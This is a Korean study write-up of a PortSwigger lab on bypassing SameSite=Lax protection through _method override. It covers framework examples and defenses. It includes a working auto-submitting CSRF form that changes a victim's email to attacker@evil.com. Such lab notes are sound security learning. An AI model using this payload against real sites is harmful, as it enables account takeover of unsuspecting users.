# Lab: SameSite Lax bypass via method override

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — SameSite=Lax 우회 / HTTP 메서드 오버라이드 / `_method` 파라미터
- **링크**: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

## 목표

세션 쿠키에 `SameSite=Lax` 가 설정되어 POST 요청 시 쿠키가 차단되지만, 애플리케이션이 `_method` 파라미터로 HTTP 메서드 오버라이드를 지원하는 허점을 이용해 GET 요청으로 POST 처리를 유발하여 이메일을 변경한다.

## SameSite=Lax 의 동작

```
SameSite=Lax 쿠키 전송 규칙:

허용 (쿠키 전송):
  외부 사이트 → 링크 클릭 (탑레벨 GET 네비게이션)
  외부 사이트 → <img src> (GET 이미지 요청)
  외부 사이트 → <script src> (GET 스크립트 요청)

차단 (쿠키 미전송):
  외부 사이트 → POST 폼 제출       ← CSRF POST 공격 차단
  외부 사이트 → fetch POST 요청
  외부 사이트 → PUT/DELETE 요청

→ POST 방식 CSRF 는 막히지만, GET 방식은 여전히 허용
```

## 취약점 — 메서드 오버라이드(`_method`)

일부 프레임워크는 `_method` 파라미터 또는 `X-HTTP-Method-Override` 헤더로 실제 HTTP 메서드를 덮어쓴다.

```
브라우저가 전송: GET /change-email?_method=POST&email=...
                ↑ SameSite=Lax → 쿠키 전송 허용 (GET 이므로)

서버가 처리:    _method=POST 를 읽고 POST 로 처리
               ↑ 실제로는 POST 엔드포인트 로직 실행
```

```
공격자의 이점:
  브라우저 입장: GET 요청 → SameSite=Lax 통과 → 쿠키 전송
  서버 입장:     POST 처리 → 이메일 변경 실행
```

## 공격 방법

### 페이로드

```html
<html>
  <body>
    <form action="https://VULNERABLE.com/my-account/change-email?_method=POST"
          method="GET">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

또는 `_method` 를 쿼리스트링 대신 폼 필드로:

```html
<form action="https://VULNERABLE.com/my-account/change-email" method="GET">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### 실행 흐름

```
1. 피해자가 공격 페이지 방문

2. GET 요청 전송:
   GET /my-account/change-email?_method=POST&email=attacker@evil.com
   Cookie: session=VICTIM_SESSION   ← SameSite=Lax → GET 이므로 쿠키 전송!

3. 서버:
   _method=POST 파라미터 확인 → POST 처리 로직 실행
   email=attacker@evil.com → 이메일 변경

4. 피해자 이메일 변경 완료
```

## 메서드 오버라이드를 지원하는 프레임워크

### Ruby on Rails

```ruby
# Rails는 기본적으로 _method 를 지원
# config/initializers/... 설정 없이도 동작

# 폼에서 사용:
<form method="POST" action="/resource">
  <input type="hidden" name="_method" value="DELETE">
</form>
# → Rails 라우터가 DELETE 로 처리

# 지원 메서드: PATCH, PUT, DELETE
# 공격: GET?_method=POST 또는 GET?_method=PATCH
```

### Node.js (method-override 미들웨어)

```javascript
const methodOverride = require('method-override')

// 쿼리스트링으로 오버라이드
app.use(methodOverride('_method'))
// GET /resource?_method=DELETE → DELETE 처리

// 헤더로 오버라이드
app.use(methodOverride('X-HTTP-Method-Override'))
// GET + X-HTTP-Method-Override: POST → POST 처리

// 커스텀 함수
app.use(methodOverride(function(req, res) {
    if (req.body && req.body._method) {
        return req.body._method;
    }
}))
```

### Spring (Java)

```java
// Spring MVC: HiddenHttpMethodFilter 빈 등록 시 활성화
@Bean
public HiddenHttpMethodFilter hiddenHttpMethodFilter() {
    return new HiddenHttpMethodFilter();
}

// application.properties
spring.mvc.hiddenmethod.filter.enabled=true

// 폼에서 사용 (Thymeleaf):
<form th:action="@{/resource}" method="post">
    <input type="hidden" name="_method" value="delete"/>
</form>
```

### Laravel (PHP)

```php
// Blade 템플릿
<form method="POST" action="/resource">
    @method('DELETE')   // → <input type="hidden" name="_method" value="DELETE">
    @csrf
</form>

// 지원 메서드: PUT, PATCH, DELETE
```

### Django (Python)

```python
# Django 기본은 미지원
# django-method-override 패키지 또는 직접 미들웨어 구현 필요

# 커스텀 미들웨어 예시
class MethodOverrideMiddleware:
    def __call__(self, request):
        if request.method == 'POST':
            method = request.POST.get('_method', '').upper()
            if method in ('PUT', 'PATCH', 'DELETE'):
                request.method = method
        return self.get_response(request)
```

## 이전 랩(002)과의 비교

| 항목 | 002 랩 | 007 랩 (이번) |
|------|--------|--------------|
| 우회 대상 | CSRF 토큰 검증 | SameSite=Lax 쿠키 제한 |
| 방법 | POST → GET 으로 변경 | GET + `_method=POST` (서버가 POST 로 처리) |
| 쿠키 전송 | SameSite 무관 (토큰만 이슈) | SameSite=Lax → GET 허용으로 쿠키 전송 |
| 핵심 | 메서드 검증 불일치 | 메서드 오버라이드로 GET/POST 경계 흐림 |

## 핵심 정리

- `SameSite=Lax` 는 POST CSRF 를 막지만 GET 요청은 허용한다.
- 애플리케이션이 `_method` 파라미터로 메서드 오버라이드를 지원하면, GET 요청으로 POST 처리를 유발할 수 있다.
- Rails, Node.js(method-override), Spring(HiddenHttpMethodFilter), Laravel 등 주요 프레임워크가 이 기능을 지원한다.
- **방어**:
  - 메서드 오버라이드 기능이 불필요하면 비활성화
  - `SameSite=Strict` 사용 (GET 도 외부 요청 시 쿠키 차단)
  - 상태 변경 작업에 CSRF 토큰 추가 (SameSite 에만 의존하지 않음)

## 배운 점 및 추가 학습

### 1. SameSite 값별 비교

```
SameSite=Strict:
  외부 사이트의 모든 요청에 쿠키 미전송
  GET 링크 클릭도 차단 → 가장 강력
  단점: UX 불편 (외부 링크로 로그인 상태 유지 불가)

SameSite=Lax (브라우저 기본값):
  외부 사이트 GET 탑레벨 네비게이션 허용
  외부 사이트 POST, fetch, XHR 차단
  → 대부분의 CSRF 방어 but 메서드 오버라이드로 우회 가능

SameSite=None; Secure:
  모든 크로스 사이트 요청에 쿠키 전송
  HTTPS 필수
  → CSRF 방어 없음 (레거시 동작)

SameSite 미설정:
  Chrome 80+: Lax 와 동일하게 처리
  단, 처음 2분간은 None 처럼 동작 (Lax-with-exception)
```

### 2. SameSite=Lax 가 허용하는 GET 요청의 의미

```
허용되는 GET:
  <a href="https://target.com/action?param=value"> 클릭
  window.location = 'https://target.com/action?param=value'
  <form method="GET"> 제출

→ 공격자가 이 경로로 GET 파라미터를 제어하면
  → 서버가 GET 으로 상태 변경을 허용하거나
  → 메서드 오버라이드를 지원하면
  → SameSite=Lax 우회 성립
```

### 3. `X-HTTP-Method-Override` 헤더 방식

```
쿼리스트링 방식:
  GET /resource?_method=POST

헤더 방식:
  GET /resource
  X-HTTP-Method-Override: POST

헤더 방식은 HTML 폼으로 직접 설정 불가
→ fetch/XHR 필요 → CORS preflight 발생 가능
→ CSRF 공격에는 쿼리스트링 방식(_method)이 더 유용
```

### 4. 메서드 오버라이드 비활성화 방법

```ruby
# Rails — 비활성화
# config/application.rb
config.action_controller.allow_forgery_protection = true
# _method 는 별도 설정 없이 기본 활성화
# 비활성화하려면 ActionDispatch::ParamsParser 커스터마이징 필요
```

```javascript
// Node.js — 미들웨어 등록 안 하면 비활성화
// app.use(methodOverride('_method'))  ← 이 줄을 제거
```

```java
// Spring — 비활성화
// application.properties
spring.mvc.hiddenmethod.filter.enabled=false
```
